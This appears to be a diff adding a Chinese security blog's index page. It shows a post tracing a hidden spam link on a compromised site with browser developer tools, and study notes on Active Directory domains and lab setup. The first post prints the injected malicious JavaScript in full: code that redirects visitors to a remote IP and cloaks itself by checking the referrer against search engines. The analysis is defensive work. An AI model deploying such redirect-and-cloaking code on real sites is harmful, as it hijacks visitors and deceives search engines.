+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">信息安全工程师，学习笔记</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%BA%8C%E7%AB%A0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-一种查看暗链来源的跟踪方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/">一种查看暗链来源的跟踪方法</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/" class="archive-article-date">
+  	<time datetime="2020-10-20T15:11:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>谷歌浏览器</p>
+<h1 id="测试目标"><a href="#测试目标" class="headerlink" title="测试目标"></a>测试目标</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.*****.cn&#x2F;wxxx&#x2F;qndt&#x2F;202007&#x2F;t20200729_811545.htm</span><br></pre></td></tr></table></figure>
+
+<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ol>
+<li>浏览器点击F12打开”开发人员工具”</li>
+<li>选择“网络”</li>
+<li>勾选“保留日志”[^1]</li>
+<li>勾选“禁用缓存”[^2]</li>
+</ol>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020231747722.png" alt="image-20201020231747722"></p>
+<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>在该页面访问挂有暗链的页面，“网络”记录下整个访问过程中所有加载的文件（未修改UA，浏览器直接跳转到404页面）</p>
+<p><img src="/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/E:%5Cfile%5Ccode%5CBlog%5Csource%5C_posts%5C2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95%5Cimage-20201020232048901.png" alt="image-20201020232048901"></p>
+<p>在”网络“内查找该404页面</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020232239806.png" alt="image-20201020232239806"></p>
+<p>点击后，选择“发起程序”标签，可查看到调用的整个程序链。</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/image-20201020232507883.png" alt="image-20201020232507883"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本次测试，请求程序链为</p>
+<p>www.*****.cn/wxxx/qndt/202007/t20200729_811545.htm</p>
+<p>发起请求，请求调用<a target="_blank" rel="noopener" href="http://js.baile89.com/sjs.js">http://js.baile89.com/sjs.js</a>  该JS文件</p>
+<p>然后浏览器执行该JS文件，依照JS，进行跳转处理（非爬虫类，跳转至404）</p>
+<h2 id="t20200729-811545-htm调用"><a href="#t20200729-811545-htm调用" class="headerlink" title="t20200729_811545.htm调用"></a>t20200729_811545.htm调用</h2><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/image-20201020232921588.png" alt="image-20201020232921588"></p>
+<h2 id="http-js-baile89-com-sjs-js代码"><a href="#http-js-baile89-com-sjs-js代码" class="headerlink" title="http://js.baile89.com/sjs.js代码"></a><a target="_blank" rel="noopener" href="http://js.baile89.com/sjs.js%E4%BB%A3%E7%A0%81">http://js.baile89.com/sjs.js代码</a></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _hmt = _hmt || [];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> hm = <span class="built_in">document</span>.createElement(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">  hm.src = <span class="string">&quot;https://hm.baidu.com/hm.js?4a9d4dfb542a69cd1415eae873f1c84c&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;script&quot;</span>)[<span class="number">0</span>]; </span><br><span class="line">  s.parentNode.insertBefore(hm, s);</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/*百度推送代码*/</span></span><br><span class="line">     <span class="keyword">var</span> bp = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">     bp.src = <span class="string">&#x27;//push.zhanzhang.baidu.com/push.js&#x27;</span>;</span><br><span class="line">     <span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;script&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">     s.parentNode.insertBefore(bp, s);</span><br><span class="line">     <span class="comment">/*360推送代码*/</span></span><br><span class="line">     <span class="keyword">var</span> src = <span class="built_in">document</span>.location.protocol + <span class="string">&#x27;//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9&#x27;</span>;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;&#x27;</span> + src + <span class="string">&#x27;&quot; id=&quot;sozz&quot;&gt;&lt;\/script&gt;&#x27;</span>);</span><br><span class="line">     &#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((navigator.userAgent.match(<span class="regexp">/(iPhone|iPod|Android|ios|mobile)/i</span>))) &#123;</span><br><span class="line">  <span class="built_in">setInterval</span>(tiaozhuan,<span class="number">500</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">&#x27;http://45.158.22.18&#x27;</span>;</span><br><span class="line">  location.replace(url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tiaozhuan</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">&#x27;http://45.158.22.18&#x27;</span>;</span><br><span class="line">  location.replace(url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bct = <span class="built_in">document</span>.referrer;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call_init_error</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.location.href = <span class="string">&quot;/404.html&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> init_flag = <span class="string">&quot;93989&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> bot = [<span class="string">&#x27;so&#x27;</span>,<span class="string">&#x27;baidu&#x27;</span>, <span class="string">&#x27;google&#x27;</span>, <span class="string">&#x27;yahoo&#x27;</span>, <span class="string">&#x27;bing&#x27;</span>, <span class="string">&#x27;soso&#x27;</span>, <span class="string">&#x27;sogou&#x27;</span>, <span class="string">&#x27;360.cn&#x27;</span>, <span class="string">&#x27;so.com&#x27;</span>, <span class="string">&#x27;youdao&#x27;</span>, <span class="string">&#x27;anquan&#x27;</span>,<span class="string">&#x27;sm.cn&#x27;</span>,<span class="string">&#x27;bsb&#x27;</span>,<span class="string">&#x27;sm&#x27;</span>];<span class="comment">//, &#x27;haosou&#x27;];</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> bot) &#123;</span><br><span class="line">    <span class="keyword">if</span> (bct.indexOf(bot[i]) != <span class="number">-1</span>) &#123;</span><br><span class="line">        init_flag = <span class="string">&quot;1245&quot;</span>;</span><br><span class="line">        browserRedirect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (init_flag == <span class="string">&quot;93989&quot;</span>) &#123;</span><br><span class="line">    call_init_error()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">调试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/10/20/%E4%B8%80%E7%A7%8D%E6%9F%A5%E7%9C%8B%E6%9A%97%E9%93%BE%E6%9D%A5%E6%BA%90%E7%9A%84%E8%B7%9F%E8%B8%AA%E6%96%B9%E6%B3%95/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-内网安全攻防学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">内网安全攻防学习笔记</a>
+    </h1>
+  
+
+        
+        <a href="/2020/10/20/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2020-10-20T11:29:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h1><h2 id="域的概念"><a href="#域的概念" class="headerlink" title="域的概念"></a>域的概念</h2><p><strong>域</strong>是一个有安全边界的计算机集合—可简单理解为升级版的工作组</p>
+<p><strong>工作组</strong>：对计算机进行分组，为解决网络的混乱而产生的概念</p>
+<h2 id="域划分"><a href="#域划分" class="headerlink" title="域划分"></a>域划分</h2><blockquote>
+<ul>
+<li>域：一个有安全边界 <a href="%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C%E7%9A%84%E6%84%8F%E6%80%9D%E6%98%AF%EF%BC%8C%E5%9C%A8%E4%B8%A4%E4%B8%AA%E5%9F%9F%E4%B8%AD%EF%BC%8C%E4%B8%80%E4%B8%AA%E5%9F%9F%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%9F%9F%E4%B8%AD%E7%9A%84%E8%B5%84%E6%BA%90">^1</a>的计算机集合</li>
+<li><strong>域控制器(Domain Controller,DC)</strong><ul>
+<li>域中一台类似管理服务器的计算机</li>
+<li>负责所有连入的计算机和用户的校验工作</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<blockquote>
+<ul>
+<li>单域：只有一个域的情况</li>
+<li>父域或子域：联系父目录与子目录的概念</li>
+<li>域树：联系数据结构-树状结构</li>
+<li>域森林：多域树的合并</li>
+<li>域名服务器：用于域名与相对应的IP转换的服务器</li>
+</ul>
+</blockquote>
+<p><strong>活动目录（Active Directory,AD）</strong>指域环境中提供目录服务的组件</p>
+<p>​    功能：</p>
+<blockquote>
+<ol>
+<li>账号集中管理</li>
+<li>软件集中管理</li>
+<li>环境集中管理</li>
+<li>增强安全性</li>
+<li>增加可靠性</li>
+</ol>
+</blockquote>
+<h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><blockquote>
+<ul>
+<li>互联网</li>
+<li>DMZ <ul>
+<li><strong>DMZ</strong>称 之为隔离区，是为了解决安全防火墙后外部网络不能访问内部网络服务器而设定的一个非安全系统与安全系统之间的缓冲区。</li>
+<li>DMZ中可以放一些必须公开的服务器设施</li>
+</ul>
+</li>
+<li>内网<ul>
+<li>办公区</li>
+<li>核心区：存储企业重要数据    </li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>一个拥有DMZ的网络通常需定义如下访问控制策略</p>
+<blockquote>
+<ul>
+<li>内&gt;外</li>
+<li>内&gt;DMZ</li>
+<li>外！&gt;内</li>
+<li>外&gt;DMZ</li>
+<li>DMZ！&gt;外</li>
+<li>DMZ！&gt;内</li>
+</ul>
+</blockquote>
+<h2 id="域内计算机分类"><a href="#域内计算机分类" class="headerlink" title="域内计算机分类"></a>域内计算机分类</h2><blockquote>
+<ul>
+<li>域控制器:用于管理所有的网络服务器，包括登录服务器、访问共享目录和资源。</li>
+<li>成员服务器:主要指安装了服务器操作系统并加入了域，但是没有安装活动目录的计算机，其主要功能为提供网络资源。</li>
+<li>客户机:可以是安装了其他操作系统的计算机，用户利用该计算机可登录域。</li>
+<li>独立服务器：与域没有关系。如果服务器既不加入域，又不安装活动目录，就称为独立服务器<ul>
+<li>独立服务器可以创建工作组，与网络内其他计算机共享资源，但不能使用活动目录提供的任何服务</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h2 id="域权限解读"><a href="#域权限解读" class="headerlink" title="域权限解读"></a>域权限解读</h2><ul>
+<li><p>域本地组</p>
+<ul>
+<li>主要用于授予本域内资源的访问权限</li>
+<li>不能嵌套在其他组内</li>
+</ul>
+</li>
+<li><p>全局组</p>
+<ul>
+<li>可以嵌套在其他组内（包括可以嵌套在另一个全局组内）</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>通用组</li>
+</ul>
+<p><strong>域本地组来自全林，作用于本域，全局组来自本域，作用于全体；通用组来自于全林，作用于全林</strong></p>
+<p>A-G-DL-P策略：指将用户账号添加到全局组中，将全局组添加到本地组，然后为域本地组分配权限。</p>
+<p>A：用户账号（Account）</p>
+<p>G：全局组（Global Group）</p>
+<p>DL：域本地组（Domain Local Group）</p>
+<p>P：权限（Permission）许可</p>
+<h2 id="域的搭建"><a href="#域的搭建" class="headerlink" title="域的搭建"></a>域的搭建</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><h4 id="windows-server-2012"><a href="#windows-server-2012" class="headerlink" title="windows server 2012"></a>windows server 2012</h4><p>网络模式：仅主机模式</p>
+<p>IP地址：192.168.216.129</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028135252495.png" alt="image-20201028135252495"></p>
+<p>准备做域控</p>
+<h4 id="Windows-10"><a href="#Windows-10" class="headerlink" title="Windows 10"></a>Windows 10</h4><p>网络模式：仅主机模式</p>
+<p>IP：192.168.216.218</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028135307109.png" alt="image-20201028135307109"></p>
+<h4 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h4><h4 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h4><p>网络模式：仅主机模式</p>
+<p>IP：192.168.216.130</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028135231578.png" alt="image-20201028135231578"></p>
+<h3 id="操作系统安装"><a href="#操作系统安装" class="headerlink" title="操作系统安装"></a>操作系统安装</h3><p>略</p>
+<h3 id="Windows-server-2012-设置"><a href="#Windows-server-2012-设置" class="headerlink" title="Windows server 2012 设置"></a>Windows server 2012 设置</h3><h4 id="DNS-设置"><a href="#DNS-设置" class="headerlink" title="DNS 设置"></a>DNS 设置</h4><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028135620827.png" alt="image-20201028135620827"></p>
+<h4 id="计算机命名"><a href="#计算机命名" class="headerlink" title="计算机命名"></a>计算机命名</h4><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028141051247.png"></p>
+<p><strong><em>记得重启</em></strong></p>
+<h4 id="安装域控及DNS服务"><a href="#安装域控及DNS服务" class="headerlink" title="安装域控及DNS服务"></a>安装域控及DNS服务</h4><h5 id="进入服务器管理器"><a href="#进入服务器管理器" class="headerlink" title="进入服务器管理器"></a>进入服务器管理器</h5><p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028135911135.png" alt="image-20201028135911135"></p>
+<h5 id="添加角色及功能"><a href="#添加角色及功能" class="headerlink" title="添加角色及功能"></a>添加角色及功能</h5><p>选择“添加角色及功能”</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028135941737.png" alt="image-20201028135941737"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140128626.png" alt="image-20201028140128626">下一步</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140201263.png" alt="image-20201028140201263"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140219172.png" alt="image-20201028140219172"></p>
+<p>进入到服务器角色选择中，勾选域服务及DNS服务</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140423279.png" alt="image-20201028140423279"></p>
+<p>下一步</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140455541.png" alt="image-20201028140455541"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140506462.png" alt="image-20201028140506462"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140515620.png" alt="image-20201028140515620"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140533308.png" alt="image-20201028140533308"></p>
+<p>安装</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028140559118.png" alt="image-20201028140559118"></p>
+<h5 id="将服务器提升为域控制器"><a href="#将服务器提升为域控制器" class="headerlink" title="将服务器提升为域控制器"></a>将服务器提升为域控制器</h5><p>服务器管理器右上角存在黄色感叹号</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028141250700.png" alt="image-20201028141250700"></p>
+<p>点击后点击“将此服务器提升为域控制器”</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028141406714.png" alt="image-20201028141406714"></p>
+<p>进入配置向导</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028141444880.png" alt="image-20201028141444880"></p>
+<p>选择添加新林，配置根域名“man.test”(需要符合DNS命名规范的根域名)</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028141736575.png" alt="image-20201028141736575"></p>
+<p>下一步，在“域控制器选项”中，将两个功能级别均设置为“windows server 2012”(即默认)</p>
+<p>第一个域控必须是全局目录服务器，且不能是只读域控制器（RODC）。</p>
+<p>设置目录还原模式密码（在开机进入安全模式修复活动目录数据库将会用到此密码）</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028141948558.png" alt="image-20201028141948558"></p>
+<p>下一步，中间有警告，可以忽略</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028142822322.png" alt="image-20201028142822322"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028142831669.png" alt="image-20201028142831669"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028142854541.png" alt="image-20201028142854541"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028142906754.png" alt="image-20201028142906754"></p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028143006709.png" alt="image-20201028143006709"></p>
+<p>安装（VMwaer简易安装过程中，服务器administrator为空密码，需要先手动设置才能安装）安装后自动重启，可以看到AD DS 和DNS了</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028143455546.png" alt="image-20201028143455546"></p>
+<h5 id="创建活动目录（active-directory）（AD）账户"><a href="#创建活动目录（active-directory）（AD）账户" class="headerlink" title="创建活动目录（active directory）（AD）账户"></a>创建活动目录（active directory）（AD）账户</h5><p>为其他服务器创建域控制器账户，进入AD DS 管理</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028143704970.png" alt="image-20201028143704970"></p>
+<p>右键，选择“active directory 用户和计算机”</p>
+<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-10-20-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20201028143814331.png" alt="image-20201028143814331"></p>
+<p>在“active directory 用户和计算机”中选择相应的根域名下的USER，新建用户</p>
